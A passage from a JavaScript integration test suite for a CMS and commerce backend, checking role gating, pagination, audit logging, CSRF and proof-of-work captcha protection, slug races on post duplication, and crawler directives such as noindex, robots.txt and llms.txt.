        }
      } else {
        fail('author login for gating test', `status=${authorLogin.status}`);
      }
    }

    // 7g-3. Viewer role: no admin UI at all.
    {
      const mkViewer = await fetch(`${BASE}/api/users/create`, {
        method: 'POST',
        headers: adminHdrs,
        body: JSON.stringify({ name: 'Viewer T', email: 'viewer-t@example.com', role: 'viewer', password: 'Viewer#Pass1' }),
      });
      if (mkViewer.status === 201) {
        const vLogin = await fetch(`${BASE}/api/auth/login`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email: 'viewer-t@example.com', password: 'Viewer#Pass1' }),
        });
        const vm = /astrobaas_session=([^;]+)/.exec(vLogin.headers.get('set-cookie') || '');
        const r = vm
          ? await fetch(`${BASE}/admin`, { headers: { Cookie: `astrobaas_session=${vm[1]}` }, redirect: 'manual' })
          : { status: 0, headers: new Headers() };
        if (r.status >= 300 && r.status < 400) ok('viewer is redirected away from /admin entirely');
        else fail('viewer /admin gate', `status=${r.status}`);
      } else {
        fail('create viewer for gating test', `status=${mkViewer.status}`);
      }
    }

    // 7g-4. Oversized JSON body → 413 before any handler buffers it.
    {
      const big = JSON.stringify({ title: 'big', content: 'x'.repeat(3 * 1024 * 1024) });
      const r = await fetch(`${BASE}/api/posts`, { method: 'POST', headers: adminHdrs, body: big });
      if (r.status === 413) ok('3MB JSON body → 413 (body-size cap)');
      else fail('body-size cap', `expected 413, got ${r.status}`);
    }
  }

  // 8. Authenticated list includes the new (draft) post.
  {
    const r = await fetch(`${BASE}/api/posts`, {
      headers: sessionCookie ? { Cookie: sessionCookie } : {},
    });
    const j = await r.json().catch(() => null);
    if (r.status === 200 && j?.success && Array.isArray(j.data)) {
      if (createdPostId && j.data.find((p) => p.id === createdPostId)) {
        ok('GET /api/posts (authed) includes the created draft');
      } else if (!createdPostId) {
        ok('GET /api/posts returned array');
      } else {
        fail('GET /api/posts (authed) lookup', 'created post not in list');
      }
    } else {
      fail('GET /api/posts (authed)', `status=${r.status}`);
    }
  }

  // 8a. Pagination: limit/offset + meta.total/hasMore.
  if (sessionCookie) {
    const cookie = { Cookie: sessionCookie };
    const all = await (await fetch(`${BASE}/api/posts`, { headers: cookie })).json().catch(() => null);
    const totalPosts = Array.isArray(all?.data) ? all.data.length : 0;
    if (totalPosts >= 2) {
      const p1 = await (await fetch(`${BASE}/api/posts?limit=1`, { headers: cookie })).json().catch(() => null);
      const p2 = await (await fetch(`${BASE}/api/posts?limit=1&offset=1`, { headers: cookie })).json().catch(() => null);
      const metaOk =
        p1?.data?.length === 1 &&
        p1?.meta?.total === totalPosts &&
        p1?.meta?.limit === 1 &&
        p1?.meta?.hasMore === true &&
        p1?.meta?.page === 1;
      if (metaOk) ok('GET /api/posts?limit= returns a page + correct meta (total/hasMore)');
      else fail('pagination meta', JSON.stringify(p1?.meta));

      if (p1?.data?.[0]?.id && p2?.data?.[0]?.id && p1.data[0].id !== p2.data[0].id) ok('GET /api/posts?offset= returns the next page');
      else fail('pagination offset', `same item across pages: ${p1?.data?.[0]?.id}`);

      if (all?.meta?.hasMore === false && all?.meta?.total === totalPosts) ok('GET /api/posts (no limit) → hasMore:false, total = count');
      else fail('pagination no-limit meta', JSON.stringify(all?.meta));
      // S5.2: no limit is now capped at 1000, far above this fixture — so the
      // envelope must be exactly what a storefront parsed before the cap.
      if (all?.meta?.limit === null && all?.meta?.offset === 0 && all?.meta?.page === 1) {
        ok('GET /api/posts (no limit) → limit:null, unchanged below the 1000-row ceiling');
      } else fail('pagination no-limit envelope', JSON.stringify(all?.meta));
    } else {
      ok('pagination skipped (need >=2 posts; not enough seeded yet)');
    }
  }

  // 8a-SCHED. The scheduled-post worker auto-publishes a post whose publish_date
  // is already past (the server runs a fast sweep — SCHEDULER_INTERVAL_MS).
  if (sessionCookie && csrfToken) {
    const adminHdrs = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const pastDate = new Date(Date.now() - 60_000).toISOString();
    const create = await fetch(`${BASE}/api/posts`, {
      method: 'POST',
      headers: adminHdrs,
      body: JSON.stringify({ title: 'Scheduled-due post', status: 'scheduled', publish_date: pastDate }),
    });
    const cj = await create.json().catch(() => null);
    const id = cj?.data?.id;
    if (create.status === 201 && id && cj.data.status === 'scheduled') {
      // Wait a few sweep intervals, then re-read.
      let published = false;
      for (let i = 0; i < 12 && !published; i++) {
        await wait(250);
        const g = await fetch(`${BASE}/api/posts/${id}`, { headers: { Cookie: sessionCookie } });
        const gj = await g.json().catch(() => null);
        if (gj?.data?.status === 'published') published = true;
      }
      if (published) ok('scheduler auto-publishes a due scheduled post');
      else fail('scheduler', 'post still not published after several sweeps');
    } else {
      fail('scheduler setup', `create status=${create.status} status=${cj?.data?.status}`);
    }
  }

  // 8a-AUDIT. The audit log captured earlier sensitive actions (admin login +
  // the API keys minted above). Admin-only; never leaks secrets.
  if (sessionCookie) {
    await wait(250); // let fire-and-forget audit writes settle
    const r = await fetch(`${BASE}/api/audit?limit=200`, { headers: { Cookie: sessionCookie } });
    const j = await r.json().catch(() => null);
    const actions = Array.isArray(j?.data) ? j.data.map((e) => e.action) : [];
    if (r.status === 200 && actions.includes('auth.login.success') && actions.includes('apikey.create'))
      ok('GET /api/audit records login + apikey.create');
    else fail('audit log', `status=${r.status} actions=${JSON.stringify([...new Set(actions)])}`);

    // No secret material in the trail (a real key is abk_ + ~32 chars; a
    // secret field would be literally named key_hash/password/secret — note
    // metadata flags like `password_changed` are fine and must NOT trip this).
    const blob = JSON.stringify(j?.data || []);
    const realKey = /abk_[A-Za-z0-9_-]{20,}/.test(blob);
    const secretField = /"(key_hash|password|password_hash|secret)"\s*:/.test(blob);
    if (!realKey && !secretField) ok('audit log carries no secrets');
    else fail('audit secret leak', `realKey=${realKey} secretField=${secretField}`);

    // ?action= filter narrows the list.
    const filtered = await fetch(`${BASE}/api/audit?action=apikey.create`, { headers: { Cookie: sessionCookie } });
    const fj = await filtered.json().catch(() => null);
    if (filtered.status === 200 && Array.isArray(fj?.data) && fj.data.every((e) => e.action === 'apikey.create')) ok('GET /api/audit?action= filters by action');
    else fail('audit filter', JSON.stringify(fj?.data?.slice(0, 2)));

    // --- the audit filters, driven over HTTP on EVERY storage driver ---
    //
    // This IS the differential test. One rule (core/audit-query.ts) has two
    // implementations — a JS filter for the document drivers, SQL for the
    // relational one — and that shape already produced a silent bug here once
    // (`?locale=`, where both were wrong in the same direction). Running the
    // same assertions against all three drivers is what stops them drifting.
    const auditQ = async (qs) => {
      const r = await fetch(`${BASE}/api/audit?${qs}`, { headers: { Cookie: sessionCookie } });
      const j = await r.json().catch(() => null);
      return { status: r.status, events: Array.isArray(j?.data) ? j.data : [], meta: j?.meta };
    };

    // Action is a PREFIX, so an admin can look at a family of events without
    // knowing the whole vocabulary.
    const byPrefix = await auditQ('action=auth.&limit=500');
    if (byPrefix.status === 200 && byPrefix.events.length > 0
      && byPrefix.events.every((e) => String(e.action).startsWith('auth.'))) {
      ok('GET /api/audit?action= matches by prefix, not just exactly');
    } else fail('audit action prefix', `n=${byPrefix.events.length}`);

    // Actor: case-insensitive substring, so a partial id works.
    const anyActor = byPrefix.events.find((e) => e.actor)?.actor;
    if (anyActor) {
      const part = String(anyActor).slice(0, Math.max(4, Math.floor(String(anyActor).length / 2)));
      const byActor = await auditQ(`actor=${encodeURIComponent(part.toUpperCase())}&limit=500`);
      if (byActor.status === 200 && byActor.events.length > 0
        && byActor.events.every((e) => String(e.actor).toLowerCase().includes(part.toLowerCase()))) {
        ok('GET /api/audit?actor= matches a partial id, case-insensitively');
      } else fail('audit actor filter', `part=${part} n=${byActor.events.length}`);
    } else fail('audit actor filter', 'no actor to test with');

    // THE date trap: `<input type="date">` sends a bare date, which as an
    // instant is midnight. Used raw as an upper bound it excludes almost all of
    // that day — so "to today" must still include events from today.
    const today = new Date().toISOString().slice(0, 10);
    const toToday = await auditQ(`to=${today}&limit=500`);
    if (toToday.status === 200 && toToday.events.length > 0) {
      ok('GET /api/audit?to=<today> includes today, not just midnight');
    } else fail('audit end-of-day bound', `n=${toToday.events.length} — a date-only "to" swallowed the day`);

    // A window that cannot contain anything must return nothing, not everything
    // — the failure mode where an ignored filter looks like a working one.
    const future = await auditQ('from=2099-01-01&limit=500');
    if (future.status === 200 && future.events.length === 0) ok('an impossible date window returns nothing');
    else fail('audit date filter ignored', `n=${future.events.length}`);

    // Newest first, on every driver.
    const ordered = await auditQ('limit=50');
    const ts = ordered.events.map((e) => e.created_at);
    if (ts.length > 1 && ts.every((t, i) => i === 0 || ts[i - 1] >= t)) ok('audit events come back newest first');
    else if (ts.length <= 1) ok('audit ordering (too few events to compare)');
    else fail('audit ordering', `${ts[0]} then ${ts[1]}`);

    // The actor list the admin UI filters by — names, so nobody has to
    // memorise user ids to answer "what did Maria change?".
    if (Array.isArray(ordered.meta?.actors) && ordered.meta.actors.every((a) => a.id && a.label)) {
      ok('audit meta lists actors with display labels');
    } else fail('audit actor labels', JSON.stringify(ordered.meta?.actors)?.slice(0, 120));

    // --- CONTENT AND COMMERCE edits are audited, not just security events ---
    //
    // The log used to record logins, keys and role changes and nothing else, so
    // "which logged-in user did what" was only ever true of security. A price
    // change, a deleted post and a moved order status are the questions an
    // operator actually brings to this page.
    {
      // Self-contained: this block runs before the catalogue tests, so it makes
      // its own product rather than depending on suite order. A test that
      // silently passes because something earlier happened to run first is a
      // test that stops working when the file is reordered.
      const auditHdrs = {
        Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
      };
      const slug = `audit-probe-${Date.now().toString(36)}`;
      const madeRes = await fetch(`${BASE}/api/products`, {
        method: 'POST', headers: auditHdrs,
        body: JSON.stringify({ name: 'Audit Probe', slug, price_cents: 15900, description: 'secret-body-text' }),
      });
      const madeId = (await madeRes.json().catch(() => null))?.data?.id;
      if (madeId) {
        await fetch(`${BASE}/api/products/${madeId}`, {
          method: 'PUT', headers: auditHdrs,
          body: JSON.stringify({ price_cents: 12900, description: 'secret-body-text-changed' }),
        });
      }

      const changed = await auditQ('action=product.&limit=500');
      const created = changed.events.filter((e) => e.action === 'product.create');
      const updated = changed.events.filter((e) => e.action === 'product.update');
      if (created.length > 0) ok('creating a product is audited');
      else fail('product.create not audited', `n=${changed.events.length}`);
      if (updated.length > 0) ok('editing a product is audited');
      else fail('product.update not audited', `n=${changed.events.length}`);

      // Every entry must name a real actor, or the log answers "what" without
      // "who" — which is the half it already had.
      if (changed.events.every((e) => e.actor && e.actor !== 'anonymous')) {
        ok('every product audit entry names its actor');
      } else fail('anonymous product audit', JSON.stringify(changed.events.map((e) => e.actor).slice(0, 4)));

      // The point of recording a change: price movements carry before AND
      // after, because "who dropped the price" is the question.
      const priced = updated.find((e) =>
        (e.metadata?.changes || []).some((c) => c.field === 'price_cents' && 'from' in c && 'to' in c));
      if (priced) ok('a price change records its before and after');
      else fail('price change not valued', JSON.stringify(updated[0]?.metadata)?.slice(0, 160));

      // …while everything else contributes a NAME only, so the audit log never
      // becomes a second copy of the content.
      const blob = JSON.stringify(changed.events);
      if (!blob.includes('secret-body-text')) ok('audit metadata records field names, not content');
      else fail('audit copied content', 'a product description reached the audit log');

      const posts = await auditQ('action=post.&limit=500');
      if (posts.events.some((e) => e.action === 'post.create')) ok('creating a post is audited');
      else fail('post.create not audited', `n=${posts.events.length}`);
      if (posts.events.some((e) => e.action === 'post.update')) ok('editing a post is audited');
      else fail('post.update not audited', `n=${posts.events.length}`);
      if (posts.events.some((e) => e.action === 'post.delete')) ok('deleting a post is audited');
      else fail('post.delete not audited', `n=${posts.events.length}`);

      const orders = await auditQ('action=order.&limit=500');
      if (orders.events.length === 0 || orders.events.every((e) => e.actor && e.actor !== 'anonymous')) {
        ok('order status changes name their actor');
      } else fail('anonymous order audit', JSON.stringify(orders.events[0]));
    }

    // Non-admin (bearer editor key) is forbidden — sanity on the gate.
    const ro = await fetch(`${BASE}/api/audit`, { headers: { Authorization: 'Bearer abk_not-real' } });
    if (ro.status === 401 || ro.status === 403) ok('GET /api/audit denies non-admin');
    else fail('audit auth gate', `status=${ro.status}`);
  }

  // 8b. Drafts must NOT leak to anonymous callers (content-gating fix).
  if (createdPostId) {
    const r = await fetch(`${BASE}/api/posts`);
    const j = await r.json().catch(() => null);
    if (
      r.status === 200 &&
      j?.success &&
      Array.isArray(j.data) &&
      !j.data.find((p) => p.id === createdPostId)
    ) {
      ok('GET /api/posts (anon) excludes the draft');
    } else {
      fail('GET /api/posts (anon) draft leak', 'draft visible to anonymous caller');
    }
  }

  // 8b-REST. RESTful PUT/DELETE /api/posts/{id} (resolve by id or slug).
  if (sessionCookie && csrfToken) {
    const adminHdrs = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const create = await fetch(`${BASE}/api/posts`, {
      method: 'POST',
      headers: adminHdrs,
      body: JSON.stringify({ title: 'REST CRUD post', status: 'draft' }),
    });
    const cj = await create.json().catch(() => null);
    const id = cj?.data?.id;
    const slug = cj?.data?.slug;
    if (create.status === 201 && id) {
      // Update by id.
      const put = await fetch(`${BASE}/api/posts/${id}`, {
        method: 'PUT',
        headers: adminHdrs,
        body: JSON.stringify({ title: 'REST CRUD post (edited)', status: 'published' }),
      });
      const pj = await put.json().catch(() => null);
      if (put.status === 200 && pj?.data?.title === 'REST CRUD post (edited)' && pj?.data?.status === 'published')
        ok('PUT /api/posts/{id} updates a post');
      else fail('PUT /api/posts/{id}', `status=${put.status} ${JSON.stringify(pj)}`);

      // Read back by slug via the same resource path.
      const getBySlug = await fetch(`${BASE}/api/posts/${slug}`);
      const gj = await getBySlug.json().catch(() => null);
      if (getBySlug.status === 200 && gj?.data?.id === id) ok('GET /api/posts/{slug} resolves the same resource');
      else fail('GET /api/posts/{slug}', `status=${getBySlug.status}`);

      // Delete by id.
      const del = await fetch(`${BASE}/api/posts/${id}`, { method: 'DELETE', headers: adminHdrs });
      if (del.status === 200) ok('DELETE /api/posts/{id} deletes a post');
      else fail('DELETE /api/posts/{id}', `status=${del.status}`);

      // Now gone.
      const after = await fetch(`${BASE}/api/posts/${id}`, { headers: { Cookie: sessionCookie } });
      if (after.status === 404) ok('GET /api/posts/{id} → 404 after delete');
      else fail('post still present after delete', `status=${after.status}`);
    } else {
      fail('REST CRUD setup', `create status=${create.status}`);
    }
  }

  // 8c. Public contact form: anonymous POST with CSRF → 201
  {
    // A notification needs somewhere to go. Setting it here also pins that the
    // recipient is resolved from settings rather than from a constant — and
    // that BOTH form paths read the same key, which is the drift this helper
    // exists to prevent.
    if (sessionCookie && csrfToken) {
      await fetch(`${BASE}/api/settings/update`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': csrfToken,
          Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
        },
        body: JSON.stringify({ contact_notify_email: 'shopstaff@example.com' }),
      }).catch(() => {});
    }

    const r = await fetch(`${BASE}/api/contact`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
        Cookie: `astrobaas_csrf=${csrfToken}`,
      },
      body: JSON.stringify({
        name: 'Smoke Tester',
        email: 'smoke@example.com',
        subject: 'general',
        message: 'Hello from the smoke test.',
      }),
    });
    if (r.status === 201) ok('POST /api/contact (anon + CSRF) → 201');
    else fail('POST /api/contact', `expected 201, got ${r.status}`);

    // THE REGRESSION. This endpoint stored the message and returned — it never
    // called sendEmail at all, so a shop using the built-in contact form heard
    // nothing until somebody opened the admin inbox. Meanwhile the CONTENT-TYPE
    // form path did send, so which kind of form you used decided whether you
    // were told about it.
    const notice = await emailReceiver.waitForMatching(
      (m) => typeof m?.subject === 'string' && /contact message/i.test(m.subject),
      6000,
    ).catch(() => null);
    if (notice) {
      ok('contact form: the shop is actually emailed about a submission');
      if (String(notice.to ?? '') === 'shopstaff@example.com') {
        ok('...at the configured contact_notify_email, not a hardcoded address');
      } else {
        fail('contact notification recipient', `went to ${JSON.stringify(notice.to)}`);
      }
      const body = String(notice.text ?? '');
      if (body.includes('Smoke Tester') && body.includes('Hello from the smoke test.')) {
        ok('...and the email carries the submitted values');
      } else {
        fail('contact notification body', `subject ok but body was ${JSON.stringify(body.slice(0, 200))}`);
      }
    } else {
      fail('contact notification', 'no email arrived for a contact submission');
    }
  }

  // 8d. Public contact form without CSRF → 403 (still protected)
  {
    const r = await fetch(`${BASE}/api/contact`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name: 'x', email: 'x@y.com', message: 'no csrf' }),
    });
    if (r.status === 403) ok('POST /api/contact without CSRF → 403');
    else fail('POST /api/contact no CSRF', `expected 403, got ${r.status}`);
  }

  // 8e. Proof-of-work captcha, end to end against the real endpoints: enable
  // it for the contact form, prove a submission without proof is refused,
  // solve a real challenge the way /captcha.js does, prove it passes ONCE
  // and is refused on replay, then switch it back off.
  if (sessionCookie && csrfToken) {
    const authed = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const anonHeaders = {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
      Cookie: `astrobaas_csrf=${csrfToken}`,
    };
    const contactBody = (powToken) => JSON.stringify({
      name: 'Pow Tester', email: 'pow@example.com', message: 'proof of work',
      ...(powToken ? { pow_token: powToken } : {}),
    });

    const offChallenge = await (await fetch(`${BASE}/api/captcha/challenge?surface=contact`)).json();
    if (offChallenge?.data?.enabled === false) ok('captcha: disabled surface says so');
    else fail('captcha disabled surface', JSON.stringify(offChallenge?.data));

    await fetch(`${BASE}/api/settings/update`, {
      method: 'POST', headers: authed, body: JSON.stringify({ captcha_surfaces: ['contact'] }),
    });

    const noProof = await fetch(`${BASE}/api/contact`, { method: 'POST', headers: anonHeaders, body: contactBody() });
    if (noProof.status === 403) ok('captcha on: contact without proof → 403');
    else fail('captcha on: contact without proof', `expected 403, got ${noProof.status}`);

    const ch = await (await fetch(`${BASE}/api/captcha/challenge?surface=contact`)).json();
    if (ch?.data?.enabled === true && ch.data.token) ok('captcha: challenge issued');
    else fail('captcha challenge', JSON.stringify(ch?.data));

    // Solve it exactly the way the widget does.
    const cryptoMod = await import('node:crypto');
    const bitsOk = (digest, bits) => {
      let remaining = bits;
      for (let i = 0; i < digest.length && remaining > 0; i++) {
        const take = Math.min(8, remaining);
        if (digest[i] >>> (8 - take) !== 0) return false;
        remaining -= take;
      }
      return remaining <= 0;
    };
    let nonce = null;
    for (let n = 0; n < 30_000_000; n++) {
      const digest = cryptoMod.createHash('sha256').update(`${ch.data.token}.${n}`).digest();
      if (bitsOk(digest, ch.data.bits)) { nonce = String(n); break; }
    }
    const proof = `${ch.data.token}::${nonce}`;

    const withProof = await fetch(`${BASE}/api/contact`, { method: 'POST', headers: anonHeaders, body: contactBody(proof) });
    if (withProof.status === 201) ok('captcha on: solved proof → 201');
    else fail('captcha on: solved proof', `expected 201, got ${withProof.status}`);

    const replayed = await fetch(`${BASE}/api/contact`, { method: 'POST', headers: anonHeaders, body: contactBody(proof) });
    if (replayed.status === 403) ok('captcha on: replayed proof → 403');
    else fail('captcha on: replayed proof', `expected 403, got ${replayed.status}`);

    const wrongSurface = await (await fetch(`${BASE}/api/captcha/challenge?surface=login`)).json();
    if (wrongSurface?.data?.enabled === false) ok('captcha: other surfaces stay off independently');
    else fail('captcha surface independence', JSON.stringify(wrongSurface?.data));

    const widget = await fetch(`${BASE}/captcha.js`);
    const widgetType = widget.headers.get('content-type') || '';
    if (widget.status === 200 && widgetType.includes('javascript')) ok('captcha: /captcha.js serves same-origin');
    else fail('captcha widget', `status=${widget.status} type=${widgetType}`);

    await fetch(`${BASE}/api/settings/update`, {
      method: 'POST', headers: authed, body: JSON.stringify({ captcha_surfaces: [] }),
    });
  }

  // 8d2. Duplicate a post: a DRAFT copy with its own slug, owned by whoever
  // clicked, carrying no history and no translation link.
  if (sessionCookie && csrfToken) {
    const authed = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const srcSlug = `smoke-dup-${Date.now().toString(36)}`;
    const src = await (await fetch(`${BASE}/api/posts`, {
      method: 'POST', headers: authed,
      body: JSON.stringify({
        title: 'Original piece', slug: srcSlug, content: '<p>body</p>',
        status: 'published', excerpt: 'ex', meta_title: 'mt', tags: ['a', 'b'],
        // Given to the SOURCE so the copy's omission of them means something:
        // asserting `views === 0` on a source that never had views, or
        // `translation_of === undefined` on one that was never in a set,
        // cannot fail for the reason it names.
        locale: 'en',
      }),
    })).json();
    const srcId = src?.data?.id;
    if (!srcId) fail('duplicate setup', `could not create the source post: ${JSON.stringify(src)?.slice(0, 120)}`);

    if (srcId) {
      const dup = await fetch(`${BASE}/api/posts/${srcId}/duplicate`, { method: 'POST', headers: authed });
      const dj = await dup.json().catch(() => null);
      const copy = dj?.data;
      if (dup.status === 201 && copy) ok('duplicate: creates a copy');
      else fail('duplicate', `status=${dup.status} ${JSON.stringify(dj)?.slice(0, 120)}`);

      if (copy) {
        // The one rule that matters most: duplicating a PUBLISHED post must
        // never publish a second copy of the same body at a second URL.
        if (copy.status === 'draft') ok('duplicate: the copy is a DRAFT even from a published source');
        else fail('duplicate status', `expected draft, got ${copy.status}`);
        if (copy.slug !== srcSlug && copy.slug.startsWith(srcSlug)) ok('duplicate: the copy gets its own slug');
        else fail('duplicate slug', copy.slug);
        if (copy.title === 'Original piece (Copy)') ok('duplicate: the title says it is a copy');
        else fail('duplicate title', copy.title);
        if (copy.views === 0) ok('duplicate: view count starts at zero');
        else fail('duplicate views', String(copy.views));
        if (copy.translation_of === undefined) ok('duplicate: not filed as a translation of the source');
        else fail('duplicate translation_of', String(copy.translation_of));
        if (copy.content === '<p>body</p>' && copy.excerpt === 'ex' && copy.meta_title === 'mt') {
          ok('duplicate: body, excerpt and SEO fields carry over');
        } else fail('duplicate content', JSON.stringify({ c: copy.content, e: copy.excerpt }));

        // Clicked twice — the old single-shot suffix collapsed two copies onto
        // one slug inside the same millisecond window.
        const dup2 = await (await fetch(`${BASE}/api/posts/${srcId}/duplicate`, { method: 'POST', headers: authed })).json();
        if (dup2?.data?.slug && dup2.data.slug !== copy.slug) ok('duplicate: clicking twice yields two distinct slugs');
        else fail('duplicate slug collision', `${copy.slug} vs ${dup2?.data?.slug}`);

        // CONCURRENTLY, which is the case a sequential test cannot reach: the
        // uniqueness check used to be a read followed by a separate write, so
        // parallel requests both saw the slug free and both took it. The
        // second post was then permanently unreachable — every resolver takes
        // the first match — while both callers got a 201.
        const racers = await Promise.all(
          Array.from({ length: 4 }, () =>
            fetch(`${BASE}/api/posts/${srcId}/duplicate`, { method: 'POST', headers: authed })
              .then((r) => r.json()).catch(() => null)),
        );
        const raceSlugs = racers.map((r) => r?.data?.slug).filter(Boolean);
        if (raceSlugs.length === 4 && new Set(raceSlugs).size === 4) {
          ok('duplicate: four CONCURRENT copies get four distinct slugs');
        } else fail('duplicate slug race', `${raceSlugs.length} created, ${new Set(raceSlugs).size} distinct: ${raceSlugs.join(',')}`);

        // And each of them actually resolves to ITSELF, which is the harm the
        // race caused: a shadowed post answers with the other one's body.
        let allResolve = raceSlugs.length === 4;
        for (const s of new Set(raceSlugs)) {
          const got = await (await fetch(`${BASE}/api/posts/${encodeURIComponent(s)}`, { headers: { Cookie: sessionCookie } })).json();
          if (got?.data?.slug !== s) {
            allResolve = false;
            fail('duplicate slug shadowing', `${s} resolved to ${got?.data?.slug}`);
            break;
          }
        }
        // Gated: this used to print a pass after the loop broke on a mismatch,
        // and also when raceSlugs was EMPTY — asserting over zero records. The
        // in-loop fail() already reports a shadowed slug, so only the case it
        // cannot see — too few copies to check — is reported here, or one
        // defect would be counted as two failures.
        if (allResolve) ok('duplicate: every concurrent copy resolves to its own record');
        else if (raceSlugs.length !== 4) fail('duplicate resolution', `only ${raceSlugs.length}/4 copies were created`);

        const anon = await fetch(`${BASE}/api/posts/${srcId}/duplicate`, { method: 'POST' });
        if (anon.status === 401 || anon.status === 403) ok('duplicate: anonymous callers are refused');
        else fail('duplicate anon', `expected 401/403, got ${anon.status}`);
      }

      // Per-post noindex: the tag on the page, and absence from sitemap+feed.
      const hidden = await (await fetch(`${BASE}/api/posts`, {
        method: 'POST', headers: authed,
        body: JSON.stringify({
          title: 'Hidden piece', slug: `${srcSlug}-hidden`, content: '<p>x</p>',
          status: 'published', noindex: true,
        }),
      })).json();
      if (hidden?.data?.noindex === true) ok('noindex: the field persists through create');
      else fail('noindex persist', JSON.stringify(hidden?.data?.noindex));

      const hiddenHtml = await (await fetch(`${BASE}/blog/${srcSlug}-hidden`)).text();
      if (/<meta name="robots" content="noindex"/.test(hiddenHtml)) ok('noindex: the page carries the robots tag');
      else fail('noindex meta', 'no robots noindex on a hidden post');

      const visibleHtml = await (await fetch(`${BASE}/blog/${srcSlug}`)).text();
      if (!/name="robots"/.test(visibleHtml)) ok('noindex: an ordinary post carries no robots tag');
      else fail('noindex bleed', 'robots tag on a post that did not ask for one');

      const sm = await (await fetch(`${BASE}/sitemap.xml`)).text();
      if (!sm.includes(`${srcSlug}-hidden`) && sm.includes(srcSlug)) {
        ok('noindex: the hidden post is out of the sitemap, the visible one is in');
      } else fail('noindex sitemap', 'sitemap disagrees with the page');

      const feed = await (await fetch(`${BASE}/rss.xml`)).text();
      if (!feed.includes(`${srcSlug}-hidden`)) ok('noindex: the hidden post is out of the feed too');
      else fail('noindex feed', 'hidden post published to feed readers');
    }
  }

  /* --- CRAWL PLUMBING: what a search engine and an assistant actually read ---
   *
   * Asserted against the SERVED bytes rather than the source, because every one
   * of these is a tag that either reaches the response or does not. A unit test
   * over a builder cannot tell you the layout forgot to render it.
   */
  {
    const home = await (await fetch(`${BASE}/`)).text();
    const postHtml = await (await fetch(`${BASE}/blog/welcome-to-astrobaas`)).text();

    // ONE H1 PER PAGE. More than one and a crawler has to guess which is the
    // page's subject; none and it has nothing to go on.
    for (const [label, html] of [['the home page', home], ['a post', postHtml]]) {
      const h1s = (html.match(/<h1[\s>]/gi) || []).length;
      if (h1s === 1) ok(`${label} has exactly one H1`);
      else fail(`${label} H1 count`, `found ${h1s}`);
    }

    // The feed has existed all along and nothing announced it, so a reader had
    // to guess the URL.
    if (/<link[^>]+rel="alternate"[^>]+application\/rss\+xml/.test(home)) {
      ok('the RSS feed is discoverable from <head>');
    } else fail('feed not announced', 'no <link rel=alternate type=application/rss+xml>');

    // Canonical, and exactly one of them — two disagreeing canonicals is a
    // documented way to have Google pick the wrong page.
    const canon = (home.match(/<link[^>]+rel="canonical"/gi) || []).length;
    if (canon === 1) ok('the home page declares exactly one canonical');
    else fail('canonical count', `found ${canon}`);

    // JSON-LD: the graph a search engine and an assistant read.
    const ldMatch = home.match(/<script type="application\/ld\+json">([\s\S]*?)<\/script>/);
    let graph = [];
    try { graph = JSON.parse(ldMatch?.[1] ?? '{}')['@graph'] ?? []; } catch { /* reported below */ }
    const types = graph.map((n) => n['@type']);
    if (types.includes('Organization')) ok('the home page emits an Organization');
    else fail('no Organization', JSON.stringify(types));
    if (types.includes('WebSite')) ok('...and a WebSite');
    else fail('no WebSite', JSON.stringify(types));

    // robots.txt: the file every crawler reads first.
    const robots = await (await fetch(`${BASE}/robots.txt`)).text();
    if (robots.includes('Sitemap:')) ok('robots.txt points at the sitemap');
    else fail('robots has no sitemap line', robots.slice(0, 120));
    if (/Disallow: \/admin/.test(robots)) ok('...and keeps the admin out of it');
    else fail('admin not disallowed', robots.slice(0, 120));

    // llms.txt: the brief an assistant reads. It must describe the SITE, not
    // only the HTTP API — an assistant asked "what does this site publish?"
    // should not get a list of REST endpoints.
    const llms = await (await fetch(`${BASE}/llms.txt`)).text();
    if (llms.includes('Feed:') && llms.includes('Sitemap:')) {
      ok('llms.txt points an assistant at the feed and the sitemap');
    } else fail('llms.txt lacks the content brief', llms.slice(0, 160));
    if (/## Recent writing/.test(llms)) ok('...and lists what has actually been published');
    else fail('llms.txt has no writing section', llms.slice(0, 160));
  }

  // 8d3. The SITE-WIDE hide switch, across every door it has to close. This
  // had no coverage at all: nothing about it is visible in a page unless you
  // go looking, so it could rot silently. Turned on, checked, turned off — and
  // checked again, because a switch that cannot be turned back off is worse
  // than one that was never turned on.
  if (sessionCookie && csrfToken) {
    const authed = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const setHide = (on) => fetch(`${BASE}/api/settings/update`, {
      method: 'POST', headers: authed, body: JSON.stringify({ discourage_indexing: on }),
    });

    await setHide(true);
    const doors = {
      home: await (await fetch(`${BASE}/`)).text(),
      blog: await (await fetch(`${BASE}/blog`)).text(),
      robots: await (await fetch(`${BASE}/robots.txt`)).text(),
      sitemap: await (await fetch(`${BASE}/sitemap.xml`)).text(),
      rss: await (await fetch(`${BASE}/rss.xml`)).text(),
      llms: await (await fetch(`${BASE}/llms.txt`)).text(),
      openapi: await (await fetch(`${BASE}/openapi.json`)).text(),
    };
    if (/<meta name="robots" content="noindex, nofollow"/.test(doors.home)
      && /<meta name="robots" content="noindex, nofollow"/.test(doors.blog)) {
      ok('hidden: every public page carries noindex, nofollow');
    } else fail('hidden pages', 'a public page shipped without the robots directive');
    if (/Disallow:\s*\/\s*$/m.test(doors.robots)) ok('hidden: robots.txt disallows everything');
    else fail('hidden robots.txt', doors.robots.slice(0, 120));
